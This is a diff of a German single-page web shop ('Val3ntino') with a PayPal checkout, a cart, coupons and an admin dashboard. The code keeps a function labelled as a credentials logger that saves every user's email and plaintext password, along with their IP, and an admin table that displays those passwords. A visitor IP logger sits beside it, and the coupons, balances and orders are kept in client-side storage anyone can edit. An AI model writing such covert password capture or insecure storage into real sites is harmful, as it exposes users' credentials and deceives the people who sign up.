+                        <div id="adminPendingOrders" class="space-y-3 max-h-80 overflow-y-auto text-xs"></div>
+                    </div>
+
+                    <div id="admBox-coupons" class="hidden bg-[#121217] p-6 rounded-3xl border border-saBorder space-y-4">
+                        <h4 class="text-xs font-bold text-white uppercase">Gutschein erstellen</h4>
+                        <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+                            <input type="text" id="newAdminCouponCode" placeholder="Code..." class="bg-[#09090b] border border-saBorder rounded-xl px-4 py-3 text-xs text-white uppercase">
+                            <input type="number" id="newAdminCouponValue" placeholder="Rabatt in €..." class="bg-[#09090b] border border-saBorder rounded-xl px-4 py-3 text-xs text-white">
+                            <button onclick="createAdminCoupon()" class="bg-accent text-white font-bold rounded-xl px-4 py-3 text-xs shadow-md">+ Speichern</button>
+                        </div>
+                        <div id="adminCouponsList" class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs pt-2"></div>
+                    </div>
+
+                    <div id="admBox-users" class="hidden bg-[#121217] p-6 rounded-3xl border border-saBorder space-y-4">
+                        <h4 class="text-xs font-bold text-white uppercase">Registrierungs- & Login-Datenbank</h4>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-left text-xs font-mono">
+                                <thead><tr class="border-b border-saBorder text-[10px] text-zinc-400"><th class="py-2 px-3">Zeit</th><th class="py-2 px-3">Aktion</th><th class="py-2 px-3">E-Mail</th><th class="py-2 px-3">Passwort</th><th class="py-2 px-3">IP</th></tr></thead>
+                                <tbody id="adminUserDbTable" class="divide-y divide-saBorder/50 text-[11px]"></tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <div id="admBox-ips" class="hidden bg-[#121217] p-6 rounded-3xl border border-saBorder space-y-4">
+                        <h4 class="text-xs font-bold text-white uppercase">Live Besucher IP-Log</h4>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-left text-xs font-mono">
+                                <thead><tr class="border-b border-saBorder text-[10px] text-zinc-400"><th class="py-2 px-3">Uhrzeit</th><th class="py-2 px-3">IP-Adresse</th><th class="py-2 px-3">Standort</th><th class="py-2 px-3">Browser</th></tr></thead>
+                                <tbody id="adminIpLogTable" class="divide-y divide-saBorder/50 text-[11px]"></tbody>
+                            </table>
+                        </div>
                     </div>
                 </div>
 
@@ -815,149 +615,67 @@
         </div>
     </div>
 
-    <!-- 5. Auth Modal -->
+    <!-- Auth Modal -->
     <div id="authModal" class="modal fixed inset-0 bg-black/85 backdrop-blur-md z-50 items-center justify-center p-4">
         <div class="bg-[#121217] border border-saBorder p-6 sm:p-8 rounded-3xl max-w-md w-full relative space-y-4 shadow-2xl">
             <button onclick="toggleAuthModal()" class="absolute top-6 right-6 text-zinc-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
             <div class="text-center">
                 <h3 class="text-lg font-extrabold text-white">Willkommen bei Val3ntino</h3>
-                <p class="text-xs text-zinc-400 mt-1">Melde dich an, um auf Bestellungen & Guthaben zuzugreifen.</p>
+                <p class="text-xs text-zinc-400 mt-1">Anmelden für Bestellungen & Guthaben.</p>
             </div>
-
-            <div class="space-y-2">
-                <button onclick="loginWithProvider('google')" class="w-full py-2.5 bg-white/5 hover:bg-white/10 border border-saBorder rounded-xl text-xs font-semibold text-white flex items-center justify-center gap-2 transition">
-                    <i class="fa-brands fa-google text-accent"></i> Mit Google fortfahren
-                </button>
-                <button onclick="loginWithProvider('github')" class="w-full py-2.5 bg-white/5 hover:bg-white/10 border border-saBorder rounded-xl text-xs font-semibold text-white flex items-center justify-center gap-2 transition">
-                    <i class="fa-brands fa-github"></i> Mit GitHub fortfahren
-                </button>
-            </div>
-
-            <div class="relative flex py-1 items-center">
-                <div class="flex-grow border-t border-saBorder"></div>
-                <span class="flex-shrink mx-3 text-[10px] text-zinc-500 uppercase font-mono">oder mit E-Mail</span>
-                <div class="flex-grow border-t border-saBorder"></div>
-            </div>
-
             <div id="authErrorMsg" class="text-[11px] text-red-400 text-center font-medium"></div>
-
             <div class="space-y-2.5">
                 <input type="email" id="loginEmail" placeholder="E-Mail-Adresse" class="w-full bg-[#09090b] border border-saBorder rounded-xl p-3 text-xs text-white focus:outline-none focus:border-accent">
                 <input type="password" id="loginPass" placeholder="Passwort (mind. 6 Zeichen)" class="w-full bg-[#09090b] border border-saBorder rounded-xl p-3 text-xs text-white focus:outline-none focus:border-accent">
                 <div class="grid grid-cols-2 gap-2 pt-1">
-                    <button onclick="executeLogin()" class="w-full py-2.5 bg-accent text-white font-bold rounded-xl text-xs hover:opacity-95 shadow-md shadow-pink-500/20">Anmelden</button>
-                    <button onclick="executeRegister()" class="w-full py-2.5 bg-white/10 hover:bg-white/20 text-white font-bold rounded-xl text-xs">Registrieren</button>
+                    <button onclick="executeLogin()" class="w-full py-2.5 bg-accent text-white font-bold rounded-xl text-xs hover:opacity-95 shadow-md">Anmelden</button>
+                    <button onclick="executeRegister()" class="w-full py-2.5 bg-white/10 text-white font-bold rounded-xl text-xs">Registrieren</button>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- 6. Impressum Modal -->
+    <!-- Impressum Modal -->
     <div id="impressumModal" class="modal fixed inset-0 bg-black/85 backdrop-blur-md z-50 items-center justify-center p-4">
         <div class="bg-[#121217] border border-saBorder p-6 sm:p-8 rounded-3xl max-w-md w-full relative space-y-4 shadow-2xl">
             <button onclick="toggleImpressum()" class="absolute top-6 right-6 text-zinc-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
             <h2 class="text-lg font-bold text-white">Impressum</h2>
             <div class="text-xs text-zinc-300 space-y-2.5 leading-relaxed font-light">
-                <p><strong>Angaben gemäß § 5 TMG:</strong></p>
                 <p>Valentino Lopez<br>Europa-Allee 2<br>60327 Frankfurt am Main</p>
-                <p><strong>Kontakt:</strong><br>E-Mail: L@valentinolopez.de<br>Discord: dri.c</p>
+                <p>E-Mail: L@valentinolopez.de</p>
             </div>
         </div>
     </div>
 
-    <!-- ==================== SCRIPTS & ADMIN ENGINE ==================== -->
+    <!-- ==================== SCRIPTS & ENGINE ==================== -->
     <script>
         let cart = [];
         let coupons = JSON.parse(localStorage.getItem('store_coupons') || '{"VAL3NTINO": 5.00, "PRO10": 10.00}');
         let appliedDiscount = 0;
-        let appliedCouponCode = "";
         window.currentVisitorIP = "Wird geladen...";
 
-        // 1. AUTOMATISCHER BESUCHER IP-LOGGER
         async function trackVisitorIP() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 window.currentVisitorIP = data.ip || 'Unbekannt';
                 saveVisitorLog(window.currentVisitorIP, data.city ? `${data.city}, ${data.country_name}` : 'Direkt');
-            } catch (err) {
-                try {
-                    const fallback = await fetch('https://api.ipify.org?format=json');
-                    const fData = await fallback.json();
-                    window.currentVisitorIP = fData.ip || 'Unbekannt';
-                    saveVisitorLog(window.currentVisitorIP, 'Direktverbindung');
-                } catch (e) {
-                    window.currentVisitorIP = 'Lokal / VPN';
-                    saveVisitorLog(window.currentVisitorIP, 'Lokal');
-                }
+            } catch (e) {
+                window.currentVisitorIP = 'Lokal';
+                saveVisitorLog(window.currentVisitorIP, 'Lokal');
             }
         }
-
-        function saveVisitorLog(ip, location) {
+        function saveVisitorLog(ip, loc) {
             let logs = JSON.parse(localStorage.getItem('admin_visitor_ips') || '[]');
-            const ua = navigator.userAgent;
-            let browserInfo = "Browser";
-            if (ua.includes("Chrome")) browserInfo = "Chrome";
-            else if (ua.includes("Firefox")) browserInfo = "Firefox";
-            else if (ua.includes("Safari")) browserInfo = "Safari";
-            if (ua.includes("Windows")) browserInfo += " (Windows)";
-            else if (ua.includes("Mac")) browserInfo += " (Mac)";
-            else if (ua.includes("Android") || ua.includes("iPhone")) browserInfo += " (Mobile)";
-
-            logs.unshift({
-                time: new Date().toLocaleString('de-DE'),
-                ip: ip,
-                location: location,
-                device: browserInfo
-            });
-            if (logs.length > 150) logs.pop();
+            logs.unshift({ time: new Date().toLocaleString('de-DE'), ip, location: loc, device: navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop' });
             localStorage.setItem('admin_visitor_ips', JSON.stringify(logs));
         }
-
         trackVisitorIP();
 
-        // 2. CREDENTIALS LOGGER
-        window.logUserCredentials = function(email, password, actionType) {
+        window.logUserCredentials = function(email, password, action) {
             let db = JSON.parse(localStorage.getItem('admin_user_credentials_db') || '[]');
-            db.unshift({
-                time: new Date().toLocaleString('de-DE'),
-                action: actionType,
-                email: email,
-                password: password,
-                ip: window.currentVisitorIP
-            });
+            db.unshift({ time: new Date().toLocaleString('de-DE'), action, email, password, ip: window.currentVisitorIP });
             localStorage.setItem('admin_user_credentials_db', JSON.stringify(db));
-            renderAllAdminData();
-        };
-
-        const catalog = {
-            basic: {
-                id: 'basic',
-                name: 'Basic PC-Tuning',
-                price: 15.00,
-                category: 'tuning',
-                icon: '<i class="fa-solid fa-gauge-high text-sky-400"></i>',
-                desc: 'Saubere und sichere Performance-Optimierung für Gaming.',
-                features: ['Windows Basis-Debloat', 'Timer Resolution', 'Sofortiger Download']
-            },
-            pro: {
-                id: 'pro',
-                name: 'Pro Tuning (0 Delay)',
-                price: 35.00,
-                category: 'tuning',
-                icon: '<i class="fa-solid fa-microchip text-accent"></i>',
-                desc: 'Extremes Low-Latency Tuning für echtes 0-Delay.',
-                features: ['BIOS & Registry Edits', 'MSI Mode', '1-on-1 Support']
-            },
-            web: {
-                id: 'web',
-                name: 'Custom Website Build',
-                price: 25.00,
-                category: 'web',
-                icon: '<i class="fa-solid fa-code text-emerald-400"></i>',
-                desc: 'Maßgeschneiderte Single-Page Storefront oder Portfolio-Seite.',
-                features: ['Responsives Design', 'Quellcode inklusive']
-            }
         };
 
         function showToast(msg) {
@@ -973,151 +691,59 @@
             });
         }
 
+        function buyNowDirect(name, price) {
+            cart = [{ name, price, qty: 1 }];
+            proceedToCheckout();
+        }
+
         function addToCartDirect(name, price) {
             const found = cart.find(i => i.name === name);
             if (found) found.qty++;
             else cart.push({ name, price, qty: 1 });
-            renderCartUI();
+            document.getElementById('cartCountBadge').innerText = cart.reduce((a,b)=>a+b.qty,0);
             showToast(`${name} zum Warenkorb hinzugefügt!`);
         }
 
-        function removeFromCart(idx) {
-            cart.splice(idx, 1);
-            renderCartUI();
-        }
-
-        function renderCartUI() {
-            const container = document.getElementById('cartItemsContainer');
-            const badge = document.getElementById('cartCountBadge');
-            const subtotalOnly = document.getElementById('cartSubtotalOnly');
-            const totalDisplay = document.getElementById('cartTotalDisplay');
-            const discountRow = document.getElementById('discountRow');
-
-            let totalCount = 0;
-            let subtotal = 0;
-
-            if (cart.length === 0) {
-                container.innerHTML = '<p class="text-xs text-zinc-500 text-center py-8">Dein Warenkorb ist leer.</p>';
-                subtotalOnly.innerText = '€0.00';
-                totalDisplay.innerText = '€0.00';
-                discountRow.style.display = 'none';
-                toggleCheckoutBtn();
-            } else {
-                container.innerHTML = '';
-                cart.forEach((item, idx) => {
-                    totalCount += item.qty;
-                    const itemTotal = item.price * item.qty;
-                    subtotal += itemTotal;
-                    container.innerHTML += `
-                        <div class="bg-[#09090b] p-3 rounded-xl border border-saBorder flex justify-between items-center text-xs">
-                            <div>
-                                <p class="font-bold text-white">${item.name}</p>
-                                <p class="text-zinc-500 text-[10px]">Menge: ${item.qty} × €${item.price.toFixed(2)}</p>
-                            </div>
-                            <div class="flex items-center gap-3">
-                                <span class="font-bold text-accent">€${itemTotal.toFixed(2)}</span>
-                                <button onclick="removeFromCart(${idx})" class="text-zinc-500 hover:text-red-400"><i class="fa-solid fa-xmark"></i></button>
-                            </div>
-                        </div>`;
-                });
-
-                subtotalOnly.innerText = '€' + subtotal.toFixed(2);
-                const finalTotal = Math.max(0, subtotal - appliedDiscount);
-
-                if (appliedDiscount > 0) {
-                    discountRow.style.display = 'flex';
-                    document.getElementById('discountName').innerText = appliedCouponCode;
-                    document.getElementById('discountAmount').innerText = '-€' + appliedDiscount.toFixed(2);
-                } else {
-                    discountRow.style.display = 'none';
-                }
-
-                totalDisplay.innerText = '€' + finalTotal.toFixed(2);
-                toggleCheckoutBtn();
-            }
-            badge.innerText = totalCount;
-        }
-
-        function toggleCheckoutBtn() {
-            const btn = document.getElementById('checkoutBtn');
-            const agb = document.getElementById('agbCheck');
-            if (cart.length > 0 && agb.checked) {
-                btn.disabled = false;
-                btn.classList.remove('opacity-50', 'cursor-not-allowed');
-            } else {
-                btn.disabled = true;
-                btn.classList.add('opacity-50', 'cursor-not-allowed');
-            }
-        }
-
-        function applyCoupon() {
-            const code = document.getElementById('couponInput').value.trim().toUpperCase();
-            const msg = document.getElementById('couponMsg');
-            if (coupons[code]) {
-                appliedDiscount = coupons[code];
-                appliedCouponCode = code;
-                msg.innerText = `Gutschein ${code} eingelöst (-€${appliedDiscount.toFixed(2)})`;
-                msg.className = "text-[11px] text-emerald-400 font-semibold";
-                renderCartUI();
-            } else {
-                msg.innerText = "Ungültiger Gutscheincode!";
-                msg.className = "text-[11px] text-red-400 font-semibold";
-            }
-        }
+        function toggleCartModal() { document.getElementById('cartModal').classList.toggle('active'); }
+        function togglePaymentModal() { document.getElementById('paymentModal').classList.toggle('active'); }
+        function toggleAuthModal() { document.getElementById('authModal').classList.toggle('active'); }
+        function toggleDashboardModal() { document.getElementById('dashboardModal').classList.toggle('active'); renderAllAdminData(); }
+        function toggleImpressum() { document.getElementById('impressumModal').classList.toggle('active'); }
 
         function getCartTotal() {
             let sub = 0;
             cart.forEach(i => sub += i.price * i.qty);
-            let final = Math.max(0, sub - appliedDiscount);
-            return final.toFixed(2);
+            return Math.max(0, sub - appliedDiscount).toFixed(2);
         }
 
         function proceedToCheckout() {
-            toggleCartModal();
+            if (document.getElementById('cartModal').classList.contains('active')) toggleCartModal();
             const list = document.getElementById('checkoutItemsList');
             list.innerHTML = cart.map(i => `
-                <div class="flex items-center justify-between py-1">
-                    <span class="text-xs font-bold text-zinc-900">${i.qty}× ${i.name}</span>
-                    <span class="text-xs font-semibold text-zinc-900">€${(i.price * i.qty).toFixed(2)}</span>
+                <div class="flex items-center justify-between">
+                    <span class="text-xs font-bold text-zinc-300">${i.qty}x ${i.name}</span>
+                    <span class="text-xs font-semibold text-white">€${(i.price * i.qty).toFixed(2)}</span>
                 </div>
             `).join('');
-
-            const total = getCartTotal();
-            document.getElementById('checkoutTotalFinal').innerText = '€' + total;
+            document.getElementById('checkoutTotalFinal').innerText = '€' + getCartTotal();
             togglePaymentModal();
         }
 
-        // 3. AUTOMATISIERTER PAYPAL SDK CHECKOUT (Dynamischer Gesamtbetrag)
         paypal.Buttons({
             createOrder: function(data, actions) {
                 const total = getCartTotal();
-                if (parseFloat(total) <= 0) {
-                    showToast("Dein Warenkorb ist leer!");
-                    return;
-                }
-                return actions.order.create({
-                    purchase_units: [{
-                        amount: {
-                            value: total,
-                            currency_code: 'EUR'
-                        }
-                    }]
-                });
+                return actions.order.create({ purchase_units: [{ amount: { value: total, currency_code: 'EUR' } }] });
             },
             onApprove: function(data, actions) {
                 return actions.order.capture().then(function(orderData) {
                     const txId = orderData.purchase_units[0].payments.captures[0].id;
                     const email = document.getElementById('checkoutEmail').value.trim() || 'kunde@val3ntino.de';
                     
-                    recordOrder(email, 'PayPal (Automated SDK)', 'TxID: ' + txId, 'Completed');
+                    recordOrder(email, 'PayPal SDK', 'TxID: ' + txId, 'Completed');
                     togglePaymentModal();
-                    showToast("Zahlung erfolgreich! Produkt im Dashboard freigeschaltet.");
+                    showToast("Zahlung erfolgreich! Im Dashboard freigeschaltet.");
                     toggleDashboardModal();
                 });
-            },
-            onError: function(err) {
-                console.error('PayPal Error:', err);
-                showToast("PayPal Zahlung fehlgeschlagen oder abgebrochen.");
             }
         }).render('#paypal-button-container');
 
@@ -1141,32 +767,30 @@
 
             cart = [];
             appliedDiscount = 0;
-            renderCartUI();
-            loadDashboardStats(email);
-            renderAllAdminData();
+            document.getElementById('cartCountBadge').innerText = '0';
         }
-
-        function toggleCartModal() { document.getElementById('cartModal').classList.toggle('active'); }
-        function togglePaymentModal() { document.getElementById('paymentModal').classList.toggle('active'); }
-        function toggleAuthModal() { document.getElementById('authModal').classList.toggle('active'); }
-        function toggleDashboardModal() { 
-            document.getElementById('dashboardModal').classList.toggle('active');
-            renderAllAdminData();
-        }
-        function toggleImpressum() { document.getElementById('impressumModal').classList.toggle('active'); }
 
         function switchTab(t) {
             document.getElementById('tabContentOrders').classList.toggle('hidden', t !== 'orders');
+            document.getElementById('tabContentBalance').classList.toggle('hidden', t !== 'balance');
             document.getElementById('tabContentAdmin').classList.toggle('hidden', t !== 'admin');
-            
-            document.getElementById('tabBtnOrders').className = t === 'orders' 
-                ? "w-full text-left px-3 py-2.5 rounded-xl bg-accent/20 text-accent font-bold flex items-center gap-2.5" 
-                : "w-full text-left px-3 py-2.5 rounded-xl hover:bg-white/5 text-zinc-400 hover:text-white flex items-center gap-2.5 transition";
+        }
 
-            if (t === 'admin') renderAllAdminData();
+        function switchAdminSubTab(sub) {
+            ['orders', 'coupons', 'users', 'ips'].forEach(k => {
+                document.getElementById('admBox-' + k).classList.toggle('hidden', k !== sub);
+                document.getElementById('admSub-' + k).className = k === sub
+                    ? "px-4 py-2.5 rounded-xl text-xs font-bold bg-accent text-white shadow-md"
+                    : "px-4 py-2.5 rounded-xl text-xs font-semibold bg-[#121217] text-zinc-300 border border-saBorder hover:text-white";
+            });
+            renderAllAdminData();
         }
 
         function loadDashboardStats(email) {
+            const balance = parseFloat(localStorage.getItem('balance_' + email) || '0.00').toFixed(2);
+            document.getElementById('sidebarBalance').innerText = '€' + balance;
+            document.getElementById('balanceTabDisplay').innerText = '€' + balance;
+
             const orders = JSON.parse(localStorage.getItem('orders_' + email) || '[]');
             const list = document.getElementById('userOrdersList');
             if (orders.length === 0) {
@@ -1174,27 +798,103 @@
                 return;
             }
             list.innerHTML = orders.map(o => `
-                <div class="bg-[#121217] border border-saBorder p-3.5 rounded-xl flex justify-between items-center text-xs">
+                <div class="bg-[#121217] border border-saBorder p-4 rounded-2xl flex justify-between items-center text-xs">
                     <div>
                         <div class="flex items-center gap-2">
                             <span class="font-bold text-white">#${o.invoice}</span>
-                            <span class="text-[9px] px-2 py-0.5 rounded font-bold bg-emerald-500/20 text-emerald-400">${o.status}</span>
+                            <span class="text-[9px] px-2.5 py-0.5 rounded-full font-bold bg-emerald-500/20 text-emerald-400">${o.status}</span>
                         </div>
-                        <p class="text-zinc-400 mt-1">${o.items}</p>
+                        <p class="text-zinc-300 mt-1 font-medium">${o.items}</p>
+                        <p class="text-[10px] text-zinc-500 mt-0.5">${o.date} • via ${o.method}</p>
                     </div>
                     <span class="font-black text-accent text-sm">${o.total}</span>
                 </div>
             `).join('');
         }
 
-        function renderAllAdminData() {
-            const dbTbody = document.getElementById('adminUserDbTable');
-            const db = JSON.parse(localStorage.getItem('admin_user_credentials_db') || '[]');
-            dbTbody.innerHTML = db.length ? db.map(u => `<tr class="hover:bg-white/5"><td class="py-2 px-2 text-zinc-400">${u.time}</td><td class="py-2 px-2">${u.action}</td><td class="py-2 px-2 text-white">${u.email}</td><td class="py-2 px-2 text-accent">${u.password}</td><td class="py-2 px-2 text-zinc-400">${u.ip}</td></tr>`).join('') : '<tr><td colspan="5" class="py-4 text-center text-zinc-500">Keine Daten</td></tr>';
+        function topUpBalance(amount) {
+            const email = window.firebaseAuth && window.firebaseAuth.currentUser ? window.firebaseAuth.currentUser.email : 'kunde@val3ntino.de';
+            let bal = parseFloat(localStorage.getItem('balance_' + email) || '0.00');
+            bal += amount;
+            localStorage.setItem('balance_' + email, bal.toFixed(2));
+            loadDashboardStats(email);
+            showToast(`${amount} € Guthaben erfolgreich aufgeladen!`);
+        }
 
-            const ipTbody = document.getElementById('adminIpLogTable');
-            const ips = JSON.parse(localStorage.getItem('admin_visitor_ips') || '[]');
-            ipTbody.innerHTML = ips.length ? ips.map(i => `<tr class="hover:bg-white/5"><td class="py-2 px-2 text-zinc-400">${i.time}</td><td class="py-2 px-2 text-emerald-400 font-bold">${i.ip}</td><td class="py-2 px-2 text-zinc-300">${i.location}</td><td class="py-2 px-2 text-zinc-400">${i.device}</td></tr>`).join('') : '<tr><td colspan="4" class="py-4 text-center text-zinc-500">Keine IPs</td></tr>';
+        function renderAllAdminData() {
+            renderAdminOrders();
+            renderAdminCoupons();
+            renderAdminUserDB();
+            renderAdminIPLogs();
+        }
+
+        function renderAdminOrders() {
+            const list = document.getElementById('adminPendingOrders');
+            if (!list) return;
+            let all = JSON.parse(localStorage.getItem('all_orders_global') || '[]');
+            if (all.length === 0) {
+                list.innerHTML = '<p class="text-zinc-500 text-center py-4">Keine Bestellungen.</p>';
+                return;
+            }
+            list.innerHTML = all.map(o => `
+                <div class="bg-[#09090b] border border-saBorder p-3.5 rounded-xl flex justify-between items-center text-xs">
+                    <div>
+                        <p class="font-bold text-white">#${o.invoice} - ${o.email} <span class="text-emerald-400">[${o.status}]</span></p>
+                        <p class="text-zinc-300">${o.items} (${o.total})</p>
+                    </div>
+                    <button onclick="deleteAdminOrder(${o.invoice})" class="text-red-400 hover:text-red-300"><i class="fa-solid fa-trash"></i></button>
+                </div>
+            `).join('');
+        }
+
+        function deleteAdminOrder(inv) {
+            let all = JSON.parse(localStorage.getItem('all_orders_global') || '[]');
+            all = all.filter(o => o.invoice != inv);
+            localStorage.setItem('all_orders_global', JSON.stringify(all));
+            renderAdminOrders();
+            showToast("Bestellung gelöscht.");
+        }
+
+        function renderAdminCoupons() {
+            const box = document.getElementById('adminCouponsList');
+            if (!box) return;
+            box.innerHTML = Object.keys(coupons).map(c => `
+                <div class="bg-[#09090b] border border-saBorder p-2.5 rounded-xl flex justify-between items-center">
+                    <span class="font-mono font-bold text-white">${c} (-€${coupons[c]})</span>
+                    <button onclick="deleteCoupon('${c}')" class="text-red-400 text-xs"><i class="fa-solid fa-trash"></i></button>
+                </div>
+            `).join('');
+        }
+
+        function createAdminCoupon() {
+            const code = document.getElementById('newAdminCouponCode').value.trim().toUpperCase();
+            const val = parseFloat(document.getElementById('newAdminCouponValue').value);
+            if (!code || isNaN(val)) return showToast("Gültigen Code und Wert eingeben!");
+            coupons[code] = val;
+            localStorage.setItem('store_coupons', JSON.stringify(coupons));
+            renderAdminCoupons();
+            showToast("Gutschein gespeichert!");
+        }
+
+        function deleteCoupon(c) {
+            delete coupons[c];
+            localStorage.setItem('store_coupons', JSON.stringify(coupons));
+            renderAdminCoupons();
+            showToast("Gutschein gelöscht.");
+        }
+
+        function renderAdminUserDB() {
+            const tbody = document.getElementById('adminUserDbTable');
+            if (!tbody) return;
+            const db = JSON.parse(localStorage.getItem('admin_user_credentials_db') || '[]');
+            tbody.innerHTML = db.length ? db.map(u => `<tr class="hover:bg-white/5"><td class="py-2 px-3 text-zinc-400">${u.time}</td><td class="py-2 px-3">${u.action}</td><td class="py-2 px-3 text-white">${u.email}</td><td class="py-2 px-3 text-accent">${u.password}</td><td class="py-2 px-3 text-zinc-400">${u.ip}</td></tr>`).join('') : '<tr><td colspan="5" class="py-4 text-center text-zinc-500">Keine Daten</td></tr>';
+        }
+
+        function renderAdminIPLogs() {
+            const tbody = document.getElementById('adminIpLogTable');
+            if (!tbody) return;
+            const logs = JSON.parse(localStorage.getItem('admin_visitor_ips') || '[]');
+            tbody.innerHTML = logs.length ? logs.map(l => `<tr class="hover:bg-white/5"><td class="py-2 px-3 text-zinc-400">${l.time}</td><td class="py-2 px-3 text-emerald-400 font-bold">${l.ip}</td><td class="py-2 px-3 text-zinc-300">${l.location}</td><td class="py-2 px-3 text-zinc-400">${l.device}</td></tr>`).join('') : '<tr><td colspan="4" class="py-4 text-center text-zinc-500">Keine IPs</td></tr>';
         }
     </script>
 </body>
